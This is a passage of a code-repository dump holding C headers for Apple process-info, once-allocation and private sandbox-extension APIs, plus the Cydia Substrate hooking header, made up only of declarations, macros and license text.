	@discussion This flag indicates that file references that were opened
		with the O_EVTONLY flag should be excluded from the matching
		criteria.
 */
#define PROC_LISTPIDSPATH_EXCLUDE_EVTONLY	2

__BEGIN_DECLS


/*!
	@function proc_listpidspath
	@discussion A function which will search through the current
		processes looking for open file references which match
		a specified path or volume.
	@param type types of processes to be searched (see proc_listpids)
	@param typeinfo adjunct information for type
	@param path file or volume path
	@param pathflags flags to control which files should be considered
		during the process search.
	@param buffer a C array of int-sized values to be filled with
		process identifiers that hold an open file reference
		matching the specified path or volume.  Pass NULL to
		obtain the minimum buffer size needed to hold the
		currently active processes.
	@param buffersize the size (in bytes) of the provided buffer.
	@result the number of bytes of data returned in the provided buffer;
		-1 if an error was encountered;
 */
int	proc_listpidspath(uint32_t	type,
			  uint32_t	typeinfo,
			  const char	*path,
			  uint32_t	pathflags,
			  void		*buffer,
			  int		buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);

int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);
int proc_listallpids(void * buffer, int buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_4_1);
int proc_listpgrppids(pid_t pgrpid, void * buffer, int buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_4_1);
int proc_listchildpids(pid_t ppid, void * buffer, int buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_4_1);
int proc_pidinfo(int pid, int flavor, uint64_t arg,  void *buffer, int buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);
int proc_pidfdinfo(int pid, int fd, int flavor, void * buffer, int buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);
int proc_pidfileportinfo(int pid, uint32_t fileport, int flavor, void *buffer, int buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_4_3);
int proc_name(int pid, void * buffer, uint32_t buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);
int proc_regionfilename(int pid, uint64_t address, void * buffer, uint32_t buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);
int proc_kmsgbuf(void * buffer, uint32_t buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);
int proc_pidpath(int pid, void * buffer, uint32_t  buffersize) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);
int proc_libversion(int *major, int * minor) __OSX_AVAILABLE_STARTING(__MAC_10_5, __IPHONE_2_0);

/*
 * Return resource usage information for the given pid, which can be a live process or a zombie.
 *
 * Returns 0 on success; or -1 on failure, with errno set to indicate the specific error.
 */
int proc_pid_rusage(int pid, int flavor, rusage_info_t *buffer) __OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0);

/* 
 * A process can use the following api to set its own process control 
 * state on resoure starvation. The argument can have one of the PROC_SETPC_XX values
 */
#define PROC_SETPC_NONE		0
#define PROC_SETPC_THROTTLEMEM	1
#define PROC_SETPC_SUSPEND	2
#define PROC_SETPC_TERMINATE	3

int proc_setpcontrol(const int control) __OSX_AVAILABLE_STARTING(__MAC_10_6, __IPHONE_3_2);
int proc_setpcontrol(const int control);

int proc_track_dirty(pid_t pid, uint32_t flags);
int proc_set_dirty(pid_t pid, bool dirty);
int proc_get_dirty(pid_t pid, uint32_t *flags);

int proc_terminate(pid_t pid, int *sig);

__END_DECLS

#endif /*_LIBPROC_H_ */

```

`BaseBin/_external/include/os/alloc_once_impl.h`:

```h
/*
 * Copyright (c) 2012-2013 Apple Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 * 
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */

#ifndef __OS_ALLOC_ONCE_IMPL__
#define __OS_ALLOC_ONCE_IMPL__

#ifndef __OS_ALLOC_INDIRECT__
#error "Please include <os/alloc_once_private.h> instead of this file directly."
#endif

#include <Availability.h>
#include <sys/types.h>
#include <os/base.h>
#include <os/once_private.h>

__BEGIN_DECLS

#define OS_ALLOC_SPI_VERSION 20120430

#define OS_ALLOC_ONCE_KEY_MAX 100

typedef os_once_t os_alloc_token_t;
struct _os_alloc_once_s {
	os_alloc_token_t once;
	void *ptr;
};

__OSX_AVAILABLE_STARTING(__MAC_10_9,__IPHONE_6_0)
extern struct _os_alloc_once_s _os_alloc_once_table[];

__OSX_AVAILABLE_STARTING(__MAC_10_9,__IPHONE_6_0)
OS_EXPORT OS_NONNULL1
void*
_os_alloc_once(struct _os_alloc_once_s *slot, size_t sz, os_function_t init);

/* 
 * The region allocated by os_alloc_once is 0-filled when initially
 * returned (or handed off to the initializer).
 */
OS_WARN_RESULT OS_NOTHROW OS_CONST
__header_always_inline void*
os_alloc_once(os_alloc_token_t token, size_t sz, os_function_t init)
{
	struct _os_alloc_once_s *slot = &_os_alloc_once_table[token];
	if (OS_EXPECT(slot->once, ~0l) != ~0l) {
		void *ptr = _os_alloc_once(slot, sz, init);
		OS_COMPILER_CAN_ASSUME(slot->once == ~0l);
		return ptr;
	}
	return slot->ptr;
}

__END_DECLS

#endif // __OS_ALLOC_ONCE_IMPL__

```

`BaseBin/_external/include/os/alloc_once_private.h`:

```h
/*
 * Copyright (c) 2012-2013 Apple Inc. All rights reserved.
 *
 * @APPLE_OSREFERENCE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. The rights granted to you under the License
 * may not be used to create, or enable the creation or redistribution of,
 * unlawful or unlicensed copies of an Apple operating system, or to
 * circumvent, violate, or enable the circumvention or violation of, any
 * terms of an Apple operating system software license agreement.
 * 
 * Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_OSREFERENCE_LICENSE_HEADER_END@
 */

#ifndef __OS_ALLOC__
#define __OS_ALLOC__

#ifndef __OS_ALLOC_INDIRECT__
#define __OS_ALLOC_INDIRECT__
#endif // __OS_ALLOC_INDIRECT__

#include <os/alloc_once_impl.h>

/* Keys for use with os_once_alloc. */

/* Keys for Libsystem. */
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_NOTIFY			0
#define OS_ALLOC_ONCE_KEY_LIBXPC					1
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_C				2
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_INFO			3
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_NETWORK			4
#define OS_ALLOC_ONCE_KEY_LIBCACHE					5
#define OS_ALLOC_ONCE_KEY_LIBCOMMONCRYPTO			6
#define OS_ALLOC_ONCE_KEY_LIBDISPATCH				7
#define OS_ALLOC_ONCE_KEY_LIBDYLD					8
#define OS_ALLOC_ONCE_KEY_LIBKEYMGR					9
#define OS_ALLOC_ONCE_KEY_LIBLAUNCH					10
#define OS_ALLOC_ONCE_KEY_LIBMACHO					11
#define OS_ALLOC_ONCE_KEY_OS_TRACE					12
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_BLOCKS			13
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_MALLOC			14
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_PLATFORM		15
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_PTHREAD			16
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_STATS			17
#define OS_ALLOC_ONCE_KEY_LIBSECINIT				18
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_CORESERVICES	19
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_SYMPTOMS		20
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_PLATFORM_ASL	21
#define OS_ALLOC_ONCE_KEY_LIBSYSTEM_FEATUREFLAGS	22

/* Keys OS_ALLOC_ONCE_KEY_MAX - 10 upwards are reserved for the system. */
#define OS_ALLOC_ONCE_KEY_RESERVED_0	(OS_ALLOC_ONCE_KEY_MAX - 10)
#define OS_ALLOC_ONCE_KEY_RESERVED_1	(OS_ALLOC_ONCE_KEY_MAX - 9)
#define OS_ALLOC_ONCE_KEY_RESERVED_2	(OS_ALLOC_ONCE_KEY_MAX - 8)
#define OS_ALLOC_ONCE_KEY_RESERVED_3	(OS_ALLOC_ONCE_KEY_MAX - 7)
#define OS_ALLOC_ONCE_KEY_RESERVED_4	(OS_ALLOC_ONCE_KEY_MAX - 6)
#define OS_ALLOC_ONCE_KEY_RESERVED_5	(OS_ALLOC_ONCE_KEY_MAX - 5)
#define OS_ALLOC_ONCE_KEY_RESERVED_6	(OS_ALLOC_ONCE_KEY_MAX - 4)
#define OS_ALLOC_ONCE_KEY_RESERVED_7	(OS_ALLOC_ONCE_KEY_MAX - 3)
#define OS_ALLOC_ONCE_KEY_RESERVED_8	(OS_ALLOC_ONCE_KEY_MAX - 2)
#define OS_ALLOC_ONCE_KEY_RESERVED_9	(OS_ALLOC_ONCE_KEY_MAX - 1)

/* OS_ALLOC_ONCE_KEY_MAX cannot be used. */

#endif // __OS_ALLOC__

```

`BaseBin/_external/include/os/once_private.h`:

```h
/*
 * Copyright (c) 2008-2013 Apple Inc. All rights reserved.
 *
 * @APPLE_APACHE_LICENSE_HEADER_START@
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * @APPLE_APACHE_LICENSE_HEADER_END@
 */

#ifndef __OS_ONCE_PRIVATE__
#define __OS_ONCE_PRIVATE__

#include <Availability.h>
#include <os/base.h>

OS_ASSUME_NONNULL_BEGIN

__BEGIN_DECLS

#define OS_ONCE_SPI_VERSION 20130313

OS_SWIFT_UNAVAILABLE("Swift has lazy init")
typedef long os_once_t;

__OSX_AVAILABLE_STARTING(__MAC_10_9,__IPHONE_7_0)
OS_EXPORT OS_NONNULL1 OS_NONNULL3 OS_NOTHROW
OS_SWIFT_UNAVAILABLE("Swift has lazy init")
void
_os_once(os_once_t *predicate, void *_Nullable context, os_function_t function);

OS_NONNULL1 OS_NONNULL3 OS_NOTHROW
__header_always_inline void
os_once(os_once_t *predicate, void *_Nullable context, os_function_t function)
{
	if (OS_EXPECT(*predicate, ~0l) != ~0l) {
		_os_once(predicate, context, function);
		OS_COMPILER_CAN_ASSUME(*predicate == ~0l);
	} else {
		os_compiler_barrier();
	}
}

/* This SPI is *strictly* for the use of pthread_once only. This is not
 * safe in general use of os_once.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_9, __IPHONE_7_0)
OS_EXPORT OS_NONNULL1 OS_NOTHROW
OS_SWIFT_UNAVAILABLE("Swift has lazy init")
void
__os_once_reset(os_once_t *val);

__END_DECLS

OS_ASSUME_NONNULL_END

#endif // __OS_ONCE_PRIVATE__

```

`BaseBin/_external/include/sandbox.h`:

```h
#ifndef __SANDBOX_H__
#define __SANDBOX_H__

#include <mach/mach.h>
#include <stdlib.h>

enum sandbox_filter_type {
	SANDBOX_FILTER_NONE,
	SANDBOX_FILTER_PATH,
	SANDBOX_FILTER_GLOBAL_NAME,
	SANDBOX_FILTER_LOCAL_NAME,
	SANDBOX_FILTER_APPLEEVENT_DESTINATION,
	SANDBOX_FILTER_RIGHT_NAME,
	SANDBOX_FILTER_PREFERENCE_DOMAIN,
	SANDBOX_FILTER_KEXT_BUNDLE_ID,
	SANDBOX_FILTER_INFO_TYPE,
	SANDBOX_FILTER_NOTIFICATION,
	// ?
	// ?
	SANDBOX_FILTER_XPC_SERVICE_NAME = 12,
	SANDBOX_FILTER_IOKIT_CONNECTION,
	// ?
	// ?
	// ?
	// ?
};

enum sandbox_extension_flags {
	FS_EXT_DEFAULTS =              0,
	FS_EXT_FOR_PATH =       (1 << 0),
	FS_EXT_FOR_FILE =       (1 << 1),
	FS_EXT_READ =           (1 << 2),
	FS_EXT_WRITE =          (1 << 3),
	FS_EXT_PREFER_FILEID =  (1 << 4),
};

enum sandbox_extension_types {
    EXTENSION_TYPE_FILE,
    EXTENSION_TYPE_MACH,
    EXTENSION_TYPE_IOKIT_REGISTRY_ENTRY,
    EXTENSION_TYPE_GENERIC,
    EXTENSION_TYPE_POSIX,
    EXTENSION_TYPE_PREFERENCE,
    EXTENSION_TYPE_SYSCTL,
    EXTENSION_TYPE_MAX /* last */
};

#define EXTENSION_FLAG_INVALID        (1 <<  0)
#define EXTENSION_FLAG_CANONICAL    (1 <<  1)
#define EXTENSION_FLAG_PREFIXMATCH    (1 <<  2)  /* Not for paths. */
#define EXTENSION_FLAG_PATHLITERAL    (1 <<  3)  /* Only for paths. */
#define EXTENSION_FLAG_NO_REPORT    (1 <<  4)
#define EXTENSION_FLAG_BIND_PID        (1 << 16)
#define EXTENSION_FLAG_BIND_PIDVERSION    (1 << 17)

#define MAX_TOKEN_SIZE 2048

struct syscall_extension_issue_args {
    uint64_t extension_class;
    uint64_t extension_type;
    uint64_t extension_data;
    uint64_t extension_flags;
    uint64_t extension_token;        /* out */
    int64_t extension_pid;
    int64_t extension_pid_version;
};

extern const char *APP_SANDBOX_IOKIT_CLIENT;
extern const char *APP_SANDBOX_MACH;
extern const char *APP_SANDBOX_READ;
extern const char *APP_SANDBOX_READ_WRITE;

extern const char *IOS_SANDBOX_APPLICATION_GROUP;
extern const char *IOS_SANDBOX_CONTAINER;

extern const enum sandbox_filter_type SANDBOX_CHECK_ALLOW_APPROVAL;
extern const enum sandbox_filter_type SANDBOX_CHECK_CANONICAL;
extern const enum sandbox_filter_type SANDBOX_CHECK_NOFOLLOW;
extern const enum sandbox_filter_type SANDBOX_CHECK_NO_APPROVAL;
extern const enum sandbox_filter_type SANDBOX_CHECK_NO_REPORT;

extern const uint32_t SANDBOX_EXTENSION_CANONICAL;
extern const uint32_t SANDBOX_EXTENSION_DEFAULT;
extern const uint32_t SANDBOX_EXTENSION_MAGIC;
extern const uint32_t SANDBOX_EXTENSION_NOFOLLOW;
extern const uint32_t SANDBOX_EXTENSION_NO_REPORT;
extern const uint32_t SANDBOX_EXTENSION_NO_STORAGE_CLASS;
extern const uint32_t SANDBOX_EXTENSION_PREFIXMATCH;
extern const uint32_t SANDBOX_EXTENSION_UNRESOLVED;

int sandbox_init(const char *profile, uint64_t flags, char **errorbuf);
int sandbox_init_with_parameters(const char *profile, uint64_t flags, const char *const parameters[], char **errorbuf);
int sandbox_init_with_extensions(const char *profile, uint64_t flags, const char *const extensions[], char **errorbuf);

int sandbox_check(pid_t pid, const char *operation, enum sandbox_filter_type, ...);
int sandbox_check_by_audit_token(audit_token_t, const char *operation, enum sandbox_filter_type, ...);
int sandbox_check_by_uniqueid(uid_t, pid_t, const char *operation, enum sandbox_filter_type, ...);

int64_t sandbox_extension_consume(const char *extension_token);
char *sandbox_extension_issue_file(const char *extension_class, const char *path, uint32_t flags);
char *sandbox_extension_issue_file_to_process(const char *extension_class, const char *path, uint32_t flags, audit_token_t);
char *sandbox_extension_issue_file_to_process_by_pid(const char *extension_class, const char *path, uint32_t flags, pid_t);
char *sandbox_extension_issue_file_to_self(const char *extension_class, const char *path, uint32_t flags);
char *sandbox_extension_issue_generic(const char *extension_class, uint32_t flags);
char *sandbox_extension_issue_generic_to_process(const char *extension_class, uint32_t flags, audit_token_t);
char *sandbox_extension_issue_generic_to_process_by_pid(const char *extension_class, uint32_t flags, pid_t);
char *sandbox_extension_issue_iokit_registry_entry_class(const char *extension_class, const char *registry_entry_class, uint32_t flags);
char *sandbox_extension_issue_iokit_registry_entry_class_to_process(const char *extension_class, const char *registry_entry_class, uint32_t flags, audit_token_t);
char *sandbox_extension_issue_iokit_registry_entry_class_to_process_by_pid(const char *extension_class, const char *registry_entry_class, uint32_t flags, pid_t);
char *sandbox_extension_issue_iokit_user_client_class(const char *extension_class, const char *registry_entry_class, uint32_t flags);
char *sandbox_extension_issue_mach(const char *extension_class, const char *name, uint32_t flags);
char *sandbox_extension_issue_mach_to_process(const char *extension_class, const char *name, uint32_t flags, audit_token_t);
char *sandbox_extension_issue_mach_to_process_by_pid(const char *extension_class, const char *name, uint32_t flags, pid_t);
char *sandbox_extension_issue_posix_ipc(const char *extension_class, const char *name, uint32_t flags);

void sandbox_extension_reap(void);
int sandbox_extension_release(int64_t extension_handle);
int sandbox_extension_release_file(int64_t extension_handle, const char *path);
int sandbox_extension_update_file(int64_t extension_handle, const char *path);

struct sandbox_policy_layout {
    void *profile;
    uint64_t len;
    void *container;
    uint64_t containerLen;
    uint64_t pad1;
    uint64_t pad2;
};

int __sandbox_ms(const char *policyname, int callnum, struct sandbox_policy_layout *policy);

#endif
```

`BaseBin/_external/include/substrate.h`:

```h
/* Cydia Substrate - Powerful Code Insertion Platform
 * Copyright (C) 2008-2019  Jay Freeman (saurik)
*/

/*
 *        Redistribution and use in source and binary
 * forms, with or without modification, are permitted
 * provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the
 *    above copyright notice, this list of conditions
 *    and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the
 *    above copyright notice, this list of conditions
 *    and the following disclaimer in the documentation
 *    and/or other materials provided with the
 *    distribution.
 * 3. The name of the author may not be used to endorse
 *    or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS''
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
 * BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
 * ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 * ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#ifndef SUBSTRATE_H_
#define SUBSTRATE_H_

#ifdef __APPLE__
#ifdef __cplusplus
extern "C" {
#endif
#include <mach-o/nlist.h>
#ifdef __cplusplus
}
#endif

#include <objc/runtime.h>
#include <objc/message.h>
#endif

#include <stdbool.h>
#include <stdlib.h>

#include <sys/types.h>

#define _finline \
    inline __attribute__((__always_inline__))
#define _disused \
    __attribute__((__unused__))

#ifdef __cplusplus
#define _default(value) = value
#else
#define _default(value)
#endif

#ifdef __cplusplus
extern "C" {
#endif

typedef const struct MSImage *MSImageRef;

#ifdef __APPLE__
#ifndef __LP64__
typedef struct mach_header MSImageHeader;
#else
typedef struct mach_header_64 MSImageHeader;
#endif
#else
typedef void MSImageHeader;
#endif

MSImageRef MSMapImage(const char *file);
const MSImageHeader *MSImageAddress(MSImageRef image);
void MSCloseImage(MSImageRef);

MSImageRef MSGetImageByName(const char *file);

void *MSFindSymbol(MSImageRef image, const char *name);
char *MSFindAddress(MSImageRef image, void **address);

void MSHookFunction(void *symbol, void *replace, void **result);
void MSHookMemory(void *target, const void *data, size_t size);

#ifdef __APPLE__
#ifdef __arm__
__attribute__((__deprecated__))
IMP MSHookMessage(Class _class, SEL sel, IMP imp, const char *prefix _default(NULL));
#endif
void MSHookMessageEx(Class _class, SEL sel, IMP imp, IMP *result);
void MSHookClassPair(Class target, Class hook, Class old);
#endif

#ifdef __ANDROID__
#include <jni.h>
void MSJavaHookClassLoad(JNIEnv *jni, const char *name, void (*callback)(JNIEnv *, jclass, void *), void *data _default(NULL));
void MSJavaHookMethod(JNIEnv *jni, jclass _class, jmethodID methodID, void *function, void **result);
void MSJavaBlessClassLoader(JNIEnv *jni, jobject loader);

typedef struct MSJavaObjectKey_ *MSJavaObjectKey;
MSJavaObjectKey MSJavaCreateObjectKey();
void MSJavaReleaseObjectKey(MSJavaObjectKey key);
void *MSJavaGetObjectKey(JNIEnv *jni, jobject object, MSJavaObjectKey key);
void MSJavaSetObjectKey(JNIEnv *jni, jobject object, MSJavaObjectKey key, void *value, void (*clean)(void *, JNIEnv *, void *) _default(NULL), void *data _default(NULL));
#endif

#ifdef __cplusplus
}
#endif

#ifdef __APPLE__

#define MSHookInterface(target, hook, base) \
@class target; \
@interface $ ## hook : base { target *$self; } @end \
@implementation $ ## hook \
+ (void) initialize {} \
@end \
@interface hook : $ ## hook @end \
@implementation hook (MS) + (void) load { \
    MSHookClassPair(objc_getClass(#target), self, class_getSuperclass(self)); \
} @end

#define MSSelf ((__typeof__($self)) self)

#endif

#ifdef __cplusplus

#ifdef __APPLE__

namespace etl {

template <unsigned Case_>
struct Case {
    static char value[Case_ + 1];
};

typedef Case<true> Yes;
typedef Case<false> No;

namespace be {
    template <typename Checked_>
    static Yes CheckClass_(void (Checked_::*)());

    template <typename Checked_>
    static No CheckClass_(...);
}

template <typename Type_>
struct IsClass {
    void gcc32();

    static const bool value = (sizeof(be::CheckClass_<Type_>(0).value) == sizeof(Yes::value));
};

}

#ifdef __arm__
template <typename Type_>
__attribute__((__deprecated__))
static inline Type_ *MSHookMessage(Class _class, SEL sel, Type_ *imp, const char *prefix = NULL) {
    return reinterpret_cast<Type_ *>(MSHookMessage(_class, sel, reinterpret_cast<IMP>(imp), prefix));
}
#endif

template <typename Type_>
static inline void MSHookMessage(Class _class, SEL sel, Type_ *imp, Type_ **result) {
    return MSHookMessageEx(_class, sel, reinterpret_cast<IMP>(imp), reinterpret_cast<IMP *>(result));
}

template <typename Type_>
static inline Type_ &MSHookIvar(id self, const char *name) {
    Ivar ivar(class_getInstanceVariable(object_getClass(self), name));
    void *pointer(ivar == NULL ? NULL : reinterpret_cast<char *>(
#if __has_feature(objc_arc)
        (__bridge void *)
#endif
    self) + ivar_getOffset(ivar));
    return *reinterpret_cast<Type_ *>(pointer);
}

#define MSAddMessage0(_class, type, arg0) \
    class_addMethod($ ## _class, @selector(arg0), (IMP) &$ ## _class ## $ ## arg0, type);
#define MSAddMessage1(_class, type, arg0) \
    class_addMethod($ ## _class, @selector(arg0:), (IMP) &$ ## _class ## $ ## arg0 ## $, type);
#define MSAddMessage2(_class, type, arg0, arg1) \
    class_addMethod($ ## _class, @selector(arg0:arg1:), (IMP) &$ ## _class ## $ ## arg0 ## $ ## arg1 ## $, type);
#define MSAddMessage3(_class, type, arg0, arg1, arg2) \
    class_addMethod($ ## _class, @selector(arg0:arg1:arg2:), (IMP) &$ ## _class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $, type);
#define MSAddMessage4(_class, type, arg0, arg1, arg2, arg3) \
    class_addMethod($ ## _class, @selector(arg0:arg1:arg2:arg3:), (IMP) &$ ## _class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $, type);
#define MSAddMessage5(_class, type, arg0, arg1, arg2, arg3, arg4) \
    class_addMethod($ ## _class, @selector(arg0:arg1:arg2:arg3:arg4:), (IMP) &$ ## _class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $ ## arg4 ## $, type);
#define MSAddMessage6(_class, type, arg0, arg1, arg2, arg3, arg4, arg5) \
    class_addMethod($ ## _class, @selector(arg0:arg1:arg2:arg3:arg4:arg5:), (IMP) &$ ## _class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $ ## arg4 ## $ ## arg5 ## $, type);
#define MSAddMessage7(_class, type, arg0, arg1, arg2, arg3, arg4, arg5, arg6) \
    class_addMethod($ ## _class, @selector(arg0:arg1:arg2:arg3:arg4:arg5:arg6:), (IMP) &$ ## _class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $ ## arg4 ## $ ## arg5 ## $ $$ arg6 ## $, type);
#define MSAddMessage8(_class, type, arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7) \
    class_addMethod($ ## _class, @selector(arg0:arg1:arg2:arg3:arg4:arg5:arg6:arg7:), (IMP) &$ ## _class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $ ## arg4 ## $ ## arg5 ## $ $$ arg6 ## $ ## arg7 ## $, type);

#define MSHookMessage0(_class, arg0) \
    MSHookMessage($ ## _class, @selector(arg0), MSHake(_class ## $ ## arg0))
#define MSHookMessage1(_class, arg0) \
    MSHookMessage($ ## _class, @selector(arg0:), MSHake(_class ## $ ## arg0 ## $))
#define MSHookMessage2(_class, arg0, arg1) \
    MSHookMessage($ ## _class, @selector(arg0:arg1:), MSHake(_class ## $ ## arg0 ## $ ## arg1 ## $))
#define MSHookMessage3(_class, arg0, arg1, arg2) \
    MSHookMessage($ ## _class, @selector(arg0:arg1:arg2:), MSHake(_class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $))
#define MSHookMessage4(_class, arg0, arg1, arg2, arg3) \
    MSHookMessage($ ## _class, @selector(arg0:arg1:arg2:arg3:), MSHake(_class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $))
#define MSHookMessage5(_class, arg0, arg1, arg2, arg3, arg4) \
    MSHookMessage($ ## _class, @selector(arg0:arg1:arg2:arg3:arg4:), MSHake(_class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $ ## arg4 ## $))
#define MSHookMessage6(_class, arg0, arg1, arg2, arg3, arg4, arg5) \
    MSHookMessage($ ## _class, @selector(arg0:arg1:arg2:arg3:arg4:arg5:), MSHake(_class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $ ## arg4 ## $ ## arg5 ## $))
#define MSHookMessage7(_class, arg0, arg1, arg2, arg3, arg4, arg5, arg6) \
    MSHookMessage($ ## _class, @selector(arg0:arg1:arg2:arg3:arg4:arg5:arg6:), MSHake(_class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $ ## arg4 ## $ ## arg5 ## $ ## arg6 ## $))
#define MSHookMessage8(_class, arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7) \
    MSHookMessage($ ## _class, @selector(arg0:arg1:arg2:arg3:arg4:arg5:arg6:arg7:), MSHake(_class ## $ ## arg0 ## $ ## arg1 ## $ ## arg2 ## $ ## arg3 ## $ ## arg4 ## $ ## arg5 ## $ ## arg6 ## $ ## arg7 ## $))

#define MSRegister_(name, dollar, colon) \
    namespace { static class C_$ ## name ## $ ## dollar { public: _finline C_$ ## name ## $ ##dollar() { \
        MSHookMessage($ ## name, @selector(colon), MSHake(name ## $ ## dollar)); \
    } } V_$ ## name ## $ ## dollar; } \

#define MSIgnore_(name, dollar, colon)

#ifdef __arm64__
#define MS_objc_msgSendSuper_stret objc_msgSendSuper
#else
#define MS_objc_msgSendSuper_stret objc_msgSendSuper_stret
#endif

#define MSMessage_(extra, type, _class, name, dollar, colon, call, args...) \
    static type _$ ## name ## $ ## dollar(Class _cls, type (*_old)(_class, SEL, ## args, ...), type (*_spr)(struct objc_super *, SEL, ## args, ...), _class self, SEL _cmd, ## args); \
    MSHook(type, name ## $ ## dollar, _class self, SEL _cmd, ## args) { \
        Class const _cls($ ## name); \
        type (* const _old)(_class, SEL, ## args, ...) = reinterpret_cast<type (* const)(_class, SEL, ## args, ...)>(_ ## name ## $ ## dollar); \
        typedef type (*msgSendSuper_t)(struct objc_super *, SEL, ## args, ...); \
        msgSendSuper_t const _spr(::etl::IsClass<type>::value ? reinterpret_cast<msgSendSuper_t>(&MS_objc_msgSendSuper_stret) : reinterpret_cast<msgSendSuper_t>(&objc_msgSendSuper)); \
        return _$ ## name ## $ ## dollar call; \
    } \
    extra(name, dollar, colon) \
